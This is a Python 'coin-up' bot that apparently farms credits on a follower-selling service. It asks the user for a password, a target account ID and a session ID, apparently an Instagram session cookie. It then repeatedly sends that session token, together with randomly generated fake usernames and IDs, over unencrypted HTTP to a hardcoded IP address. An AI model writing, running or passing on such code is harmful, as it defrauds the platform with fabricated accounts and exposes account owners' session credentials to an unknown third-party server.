import random
import string
import requests
import hashlib

ch = "VjJjV"
ourlogo = """
  __  __                             _ 
 |  \/  | ___   __ _ _ __ ___   __ _| |
 | |\/| |/ _ \ / _` | '_ ` _ \ / _` | |
 | |  | | (_) | (_| | | | | | | (_| | |
 |_|  |_|\___/ \__,_|_| |_| |_|\__,_|_|
        
        GoldFollower CoinUp V4
 Telegram: @VjjjV || MyAccount: @DaaaD 

"""

print(ourlogo)
password = input("(!) PASSWORD : ")
target_pk = input("(!) PK : ")
session_id = input("(!) SESSION : ")

def coin(order):
    Errors = 0
    Order_Count = order

    pk =  random.randint(20000000000,53000000000)
    username = gen_username()
    print(f"Start Coin-Up With : Username => {username} , ID => {pk}")
    while True:
        try:
            
                url = "http://178.79.156.57/gold/?"
                
                headers = {
                    "moamal":hashlib.md5(ch.encode('utf-8')).hexdigest(),
                    "User-Agent":"Mozilla/5.0 (Windows NT 2.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 VjjjV/537.36",
                    "channel":hashlib.md5(ourlogo.encode('utf-8')).hexdigest(),
"password":hashlib.md5(password.encode('utf-8')).hexdigest(),
                }
                data = f"user={username}&id={pk}&target={target_pk}&session={session_id}"
                req_coin = requests.get(url=url+data, headers=headers).json()
                message = req_coin['message']
                if (message == "success" or message == "error"):
                    orderstatus = req_coin['order_status']
                    if (orderstatus == "Done Sir"):
                        Order_Count +=1
                        coin(Order_Count)
                    print(f"Coin : {req_coin['coin']}, Order : {Order_Count}")
                else:
                    print(message)
                    break
        except:
            Errors +=1
            continue

def gen_username():
    return ''.join(random.sample((string.ascii_uppercase+string.digits),6))
coin(0)